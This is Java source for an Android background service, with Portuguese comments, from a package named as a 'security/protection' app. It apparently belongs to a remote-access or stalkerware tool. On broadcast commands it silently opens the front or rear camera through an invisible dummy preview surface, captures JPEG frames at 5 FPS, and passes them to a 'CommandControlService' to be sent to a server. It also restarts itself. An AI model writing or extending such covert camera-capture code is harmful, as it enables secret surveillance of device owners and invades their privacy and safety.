package com.seguranca.protecao;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

/**
 * 📷 SERVIÇO DE CÂMERA EM TEMPO REAL
 * 
 * Captura frames da câmera frontal ou traseira e envia para o servidor.
 */
@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class CameraService extends Service {
    private static final String TAG = "CameraService";
    
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    
    private boolean isCapturing = false;
    private String currentCameraId = null; // Será detectado automaticamente
    private String frontCameraId = null;
    private String backCameraId = null;
    private SurfaceTexture dummySurfaceTexture;
    private Surface dummySurface;
    
    private BroadcastReceiver cameraReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean enabled = intent.getBooleanExtra("enabled", false);
            Log.d(TAG, "📷 Comando recebido: " + (enabled ? "ATIVAR" : "DESATIVAR"));
            
            if (enabled) {
                // Verifica se veio parâmetro de câmera
                String camera = intent.getStringExtra("camera");
                if (camera != null) {
                    // Usa os IDs detectados dinamicamente
                    if (camera.equals("front") && frontCameraId != null) {
                        currentCameraId = frontCameraId;
                    } else if (camera.equals("back") && backCameraId != null) {
                        currentCameraId = backCameraId;
                    }
                    Log.d(TAG, "📷 Câmera selecionada: ID " + currentCameraId);
                }
                startCapture();
            } else {
                stopCapture();
            }
        }
    };
    
    private BroadcastReceiver cameraSwitchReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String camera = intent.getStringExtra("camera");
            if (camera != null) {
                // Alterna entre as câmeras detectadas
                String newCameraId = null;
                if (camera.equals("front") && frontCameraId != null) {
                    newCameraId = frontCameraId;
                } else if (camera.equals("back") && backCameraId != null) {
                    newCameraId = backCameraId;
                }
                
                if (newCameraId != null && !newCameraId.equals(currentCameraId)) {
                    currentCameraId = newCameraId;
                    Log.d(TAG, "📷 Alternando para câmera: ID " + currentCameraId);
                    
                    // Se já está capturando, reinicia com nova câmera
                    if (isCapturing) {
                        stopCapture();
                        backgroundHandler.postDelayed(() -> startCapture(), 500);
                    }
                } else {
                    Log.w(TAG, "⚠️ Câmera solicitada não disponível: " + camera);
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "📷 CameraService criado");
        
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        
        // Lista e detecta câmeras disponíveis
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            Log.d(TAG, "📷 Câmeras disponíveis: " + Arrays.toString(cameraIds));
            
            for (String id : cameraIds) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = id;
                        Log.d(TAG, "📷 Câmera FRONTAL detectada: ID " + id);
                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                        Log.d(TAG, "📷 Câmera TRASEIRA detectada: ID " + id);
                    }
                }
            }
            
            // Define câmera padrão (prefere traseira, senão usa frontal, senão usa primeira disponível)
            if (backCameraId != null) {
                currentCameraId = backCameraId;
            } else if (frontCameraId != null) {
                currentCameraId = frontCameraId;
            } else if (cameraIds.length > 0) {
                currentCameraId = cameraIds[0];
            }
            
            Log.d(TAG, "📷 Câmera padrão selecionada: ID " + currentCameraId);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao listar câmeras: " + e.getMessage());
        }
        
        // Registra receivers
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.TOGGLE_CAMERA");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(cameraReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(cameraReceiver, filter);
        }
        
        IntentFilter switchFilter = new IntentFilter("com.seguranca.protecao.SWITCH_CAMERA");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(cameraSwitchReceiver, switchFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(cameraSwitchReceiver, switchFilter);
        }
        
        startBackgroundThread();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Erro ao parar thread: " + e.getMessage());
            }
        }
    }

    private void startCapture() {
        if (isCapturing) {
            Log.w(TAG, "⚠️ Já está capturando!");
            return;
        }
        
        if (currentCameraId == null) {
            Log.e(TAG, "❌ Nenhuma câmera disponível!");
            return;
        }
        
        try {
            String cameraType = currentCameraId.equals(frontCameraId) ? "FRONTAL" : "TRASEIRA";
            Log.d(TAG, "📷 Iniciando captura da câmera " + cameraType + " (ID: " + currentCameraId + ")");
            
            // Cria ImageReader para capturar frames
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(imageAvailableListener, backgroundHandler);
            
            // Abre câmera
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.openCamera(currentCameraId, stateCallback, backgroundHandler);
            }
            
            isCapturing = true;
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Permissão de câmera negada: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao iniciar captura: " + e.getMessage());
        }
    }

    private void stopCapture() {
        Log.d(TAG, "📷 Parando captura...");
        isCapturing = false;
        
        if (captureSession != null) {
            try {
                captureSession.stopRepeating();
                captureSession.close();
            } catch (Exception e) {
                Log.e(TAG, "Erro ao fechar sessão: " + e.getMessage());
            }
            captureSession = null;
        }
        
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        if (dummySurface != null) {
            dummySurface.release();
            dummySurface = null;
        }
        
        if (dummySurfaceTexture != null) {
            dummySurfaceTexture.release();
            dummySurfaceTexture = null;
        }
    }

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            Log.d(TAG, "✅ Câmera aberta!");
            cameraDevice = camera;
            createCaptureSession();
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            Log.d(TAG, "📷 Câmera desconectada");
            camera.close();
            cameraDevice = null;
        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            Log.e(TAG, "❌ Erro na câmera: " + error);
            camera.close();
            cameraDevice = null;
        }
    };

    private void createCaptureSession() {
        try {
            // Cria SurfaceTexture dummy (necessário para preview invisível)
            dummySurfaceTexture = new SurfaceTexture(0);
            dummySurfaceTexture.setDefaultBufferSize(640, 480);
            dummySurface = new Surface(dummySurfaceTexture);
            
            // Cria sessão com ImageReader e Surface dummy
            cameraDevice.createCaptureSession(
                Arrays.asList(imageReader.getSurface(), dummySurface),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        if (cameraDevice == null) return;
                        
                        captureSession = session;
                        try {
                            // Cria request de captura
                            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                            builder.addTarget(imageReader.getSurface());
                            builder.addTarget(dummySurface);
                            
                            // Configurações
                            builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 80);
                            
                            // Inicia captura contínua (5 FPS)
                            session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                            
                            Log.d(TAG, "✅ Sessão de captura iniciada!");
                            
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Erro ao configurar captura: " + e.getMessage());
                        }
                    }

                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                        Log.e(TAG, "❌ Falha ao configurar sessão de captura");
                    }
                },
                backgroundHandler
            );
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao criar sessão: " + e.getMessage());
        }
    }

    private final ImageReader.OnImageAvailableListener imageAvailableListener = new ImageReader.OnImageAvailableListener() {
        private long lastFrameTime = 0;
        private static final long FRAME_INTERVAL = 200; // 5 FPS (200ms entre frames)
        
        @Override
        public void onImageAvailable(ImageReader reader) {
            // Limita para 5 FPS
            long now = System.currentTimeMillis();
            if (now - lastFrameTime < FRAME_INTERVAL) {
                Image image = reader.acquireLatestImage();
                if (image != null) image.close();
                return;
            }
            lastFrameTime = now;
            
            Image image = null;
            try {
                image = reader.acquireLatestImage();
                if (image == null) return;
                
                // Converte Image para JPEG
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                
                // Envia para servidor
                sendFrameToServer(bytes);
                
                Log.d(TAG, "📷 Frame capturado: " + bytes.length + " bytes");
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao processar frame: " + e.getMessage());
            } finally {
                if (image != null) {
                    image.close();
                }
            }
        }
    };

    private void sendFrameToServer(byte[] jpegData) {
        // Envia para CommandControlService
        Intent intent = new Intent("com.seguranca.protecao.CAMERA_FRAME_READY");
        intent.setPackage(getPackageName());
        intent.putExtra("frame", jpegData);
        sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "📷 CameraService destruído");
        
        stopCapture();
        stopBackgroundThread();
        
        try {
            unregisterReceiver(cameraReceiver);
            unregisterReceiver(cameraSwitchReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver: " + e.getMessage());
        }
    }
}
